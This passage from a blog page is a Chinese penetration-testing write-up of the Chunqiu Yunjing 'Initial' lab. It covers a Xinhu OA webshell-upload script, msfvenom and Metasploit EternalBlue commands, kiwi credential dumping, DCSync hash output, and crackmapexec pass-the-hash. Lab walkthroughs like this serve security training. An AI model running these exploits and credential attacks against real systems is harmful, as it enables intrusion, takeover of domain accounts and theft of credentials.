+socks5  127.0.0.1 12345（要注释掉不需要的代理）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>测试链接：</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 curl -v http://172.22.1.18/?m=login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>成功返回网页html的话，说明流量转发成功。</p>
+<pre class="line-numbers language-none"><code class="language-none">./linux_x64_admin -c 39.99.138.127:7879 -s 123
+
+chmod +x 文件名                                  增加权限
+chmod 777 文件名                                   给所有用户加权限
+
+/var/www/html/linux_x64_agent -l 7879 -s 123
+
+topo
+use 0
+help
+forward 8084 172.22.1.18:80（映射）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="172-22-1-18"><a href="#172-22-1-18" class="headerlink" title="172.22.1.18"></a>172.22.1.18</h2><p>172.22.1.18是信呼OA，发现有弱密钥登陆<code>admin/admin123</code></p>
+<p>/#信呼安装后默认存在账号diaochan/xiaoqiao/daqiao/rock/zhangfei/zhaozl等用户，密码都是123456</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Error1s/p/16869854.html">信呼v2.2.1文件上传漏洞复现 - 钎劫 - 博客园</a></p>
+<p>如图filecontid为17，即访问<code>task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=17</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2a14a47eb87dab6212423b526937a0cf.png"></p>
+<p>一开始的图片为上传路径</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/71188d2c9a33992084f1de54e1a8a1ad.png"></p>
+<p><code>upload/2025-07/31_21454761.php?1=system("whoam");</code></p>
+<p>还可以</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+url_pre <span class="token operator">=</span> <span class="token string">'http://172.22.1.18/'</span>
+url1 <span class="token operator">=</span> url_pre <span class="token operator">+</span> <span class="token string">'/?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953'</span>
+url2 <span class="token operator">=</span> url_pre <span class="token operator">+</span> <span class="token string">'/index.php?m=upfile&amp;a=upload&amp;d=&amp;public=1&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913'</span>
+url3 <span class="token operator">=</span> url_pre <span class="token operator">+</span> <span class="token string">'/task.php?m=qc1oudcos&amp;runt&amp;a=run&amp;fileid=11'</span>
+data1 <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token string">'rempass'</span><span class="token punctuation">:</span> <span class="token string">'0'</span><span class="token punctuation">,</span>
+    <span class="token string">'jmpass'</span><span class="token punctuation">:</span> <span class="token string">'false'</span><span class="token punctuation">,</span>
+    <span class="token string">'device'</span><span class="token punctuation">:</span> <span class="token string">'1625884034525'</span><span class="token punctuation">,</span>
+    <span class="token string">'type'</span><span class="token punctuation">:</span> <span class="token string">'0'</span><span class="token punctuation">,</span>
+    <span class="token string">'adminuser'</span><span class="token punctuation">:</span> <span class="token string">'yWwtaW4='</span><span class="token punctuation">,</span>
+    <span class="token string">'adminpass'</span><span class="token punctuation">:</span> <span class="token string">'yWwtaW4xMjM='</span><span class="token punctuation">,</span>
+    <span class="token string">'yanzm'</span><span class="token punctuation">:</span> <span class="token string">''</span>
+<span class="token punctuation">}</span>
+r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1<span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">)</span>
+r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url2<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.php'</span><span class="token punctuation">,</span> <span class="token string">'r+'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+filepath <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'filepath'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+filepath <span class="token operator">=</span> <span class="token string">"/"</span> <span class="token operator">+</span> filepath<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.up temp'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'.php'</span>
+<span class="token builtin">id</span> <span class="token operator">=</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span>
+url3 <span class="token operator">=</span> url_pre <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f'/task.php?m=qc1oudcos&amp;runt&amp;a=run&amp;fileid=</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">id</span><span class="token punctuation">}</span></span><span class="token string">'</span></span>
+r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url3<span class="token punctuation">)</span>
+r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_pre <span class="token operator">+</span> filepath <span class="token operator">+</span> <span class="token string">"?1=system('dir')"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>r1filepath<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>用 proxychains 跑脚本</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 python3 2.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>以同样方式生成后门并链接后门</p>
+<p>然后本地生成一个正向shell的windows的64位后门<br><code>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8765 -f exe -o 77.exe</code><br>然后蚁剑上传<br>配置msf</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/bind_tcp
+set rhost 172.22.1.18
+set lport 8765
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="172-22-1-21"><a href="#172-22-1-21" class="headerlink" title="172.22.1.21"></a>172.22.1.21</h2><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>因为扫出127.022.1.21有永恒之蓝，所以用proxychains和msf直接打</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ElsonHY/article/details/109939420">MS17-010（Eternal blue永恒之蓝）漏洞利用+修复方法-CSDN博客</a></p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set payload windows/x64/meterpreter/bind_tcp_uuid
+set RHOSTS 172.22.1.21
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>直接获得shell</p>
+<p>还可以ms17_010_command，这里还需要一些参数，我们去18那个机器拿，因为18机器运行gituid后发现为system权限，所以可以利用kiwi模块（使用kiwi模块需要system权限），然后用creds_all获取所有凭证<br><code>load kiwi</code><br><code>creds_all</code></p>
+<pre class="line-numbers language-none"><code class="language-none">
+Username        Domain    NTLM                              SHA1
+--------        ------    ----                              ----
+Charles         XIAORANG  f6a9881cd5ae709abb4ac9ab87f24617  99439e2268d0f5063928f523d5d44c8d69be7e34
+XIAORANG-OA01$  XIAORANG  dc5f050393a7cc83e0518b8015b8b65d  fc0612848c69ce0b4f2afc76e506289e4bc97bd8
+XIAORANG-OA01$  XIAORANG  d87c972fc49ec955dd227c1c1ec1beff  e33a635b6cc6c39931023ed2b49805207d7cf57e
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里我们通过XIAORANG-OA01$的NTLM进行伪造，注意，两个NTLM都试一遍，有一个是失效的，同时设置smbpass由于格式为LM:NTLM，但是LM不重要，所以用0填充</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains msfconsole
+use auxiliary/admin/smb/ms17_010_command            (search ms17_010_command)
+set payload windows/x64/meterpreter/bind_tcp
+set rhosts 172.22.1.21
+set smbpass 00000000000000000000000000000000:d87c972fc49ec955dd227c1c1ec1beff
+set smbdomain XIAORANG.LAB
+set smbuser XIAORANG-OA01\$
+set commond whoami
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>后续可以利用SMB等方法将后门发上传上去后远程执行即可获取meterpertre</p>
+<h2 id="172-22-1-2"><a href="#172-22-1-2" class="headerlink" title="172.22.1.2"></a>172.22.1.2</h2><p>然后进行DCSync攻击</p>
+<blockquote>
+<p>DCSync利用原理：<br>利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">要想使用 DCSync 必须获得以下任一用户的权限：
+Administrators 组内的用户
+Domain Admins 组内的用户
+Enterprise Admins 组内的用户域控制器的计算机帐户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们回到一开始 fscan 的扫描结果，我们用永恒之蓝打下的这台机子是 enterprise 用户，也就是说满足 DCSync 攻击的条件</p>
+<blockquote>
+<ol>
+<li><code>load kiwi</code></li>
+</ol>
+<ul>
+<li>作用：在 Meterpreter 会话中加载 Kiwi 模块（Mimikatz 的 Metasploit 集成版本），该模块用于抓取系统密码、哈希值、票据等敏感信息。</li>
+<li>前提：需要获得系统的管理员权限（通常是 SYSTEM 权限）才能正常加载和使用。</li>
+</ul>
+<ol start="2">
+<li><code>kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv</code></li>
+</ol>
+<ul>
+<li><p>这是通过 Kiwi 模块调用 Mimikatz 的</p>
+<pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>命令，主要用于从域控制器（DC）同步用户凭证信息：</p>
+<ul>
+<li><code>lsadump::dcsync</code>：利用域内复制机制（DCSync）从域控制器提取用户哈希等信息，无需直接在 DC 上执行命令。</li>
+<li><code>/domain:xiaorang.lab</code>：指定目标域为<code>xiaorang.lab</code>。</li>
+<li><code>/all</code>：提取域内所有用户的信息。</li>
+<li><code>/csv</code>：以 CSV 格式输出结果，便于后续处理。</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">导出域内哈希
+load kiwi
+kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv
+
+[DC] 'xiaorang.lab' will be the domain
+[DC] 'DC01.xiaorang.lab' will be the DC server
+[DC] Exporting domain 'xiaorang.lab'
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514
+1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512
+1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512
+1000    DC01$   4e5dbcda5175afea09f2af7c2026a595        532480
+500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512
+1104    XIAORANG-OA01$  d87c972fc49ec955dd227c1c1ec1beff        4096
+1108    XIAORANG-WIN7$  95d6ad215e1b8d5b63ba9726e9e556b6        4096<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>获得了Administrator的hash，再利用crackmapexec进行hash传递（PTH:pass the hash）即可</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 -f /etc/proxychains4.conf crackmapexec smb 172.22.1.2 -u administrator -H 10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>/#还是proxychains4自己看看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7b94d7312a328fec441f3a6208c1f01c.png"></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">q1n9</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2025/08/04/initial/">http://example.com/2025/08/04/initial/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">q1n9</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">
+                                    <span class="chip bg-color">春秋云镜</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">渗透</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2025/08/07/nep/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="nepctf">
+                        
+                        <span class="card-title">nepctf</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-08-07
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
+                                    网安
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/wp/">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/07/20/2025/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="r3tf">
+                        
+                        <span class="card-title">r3tf</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-07-20
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
+                                    网安
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/wp/">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2025</span>
+            
+            <a href="/about" target="_blank">q1n9</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">113.1k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/lingqing777" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1625684832@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1625684832" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1625684832" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
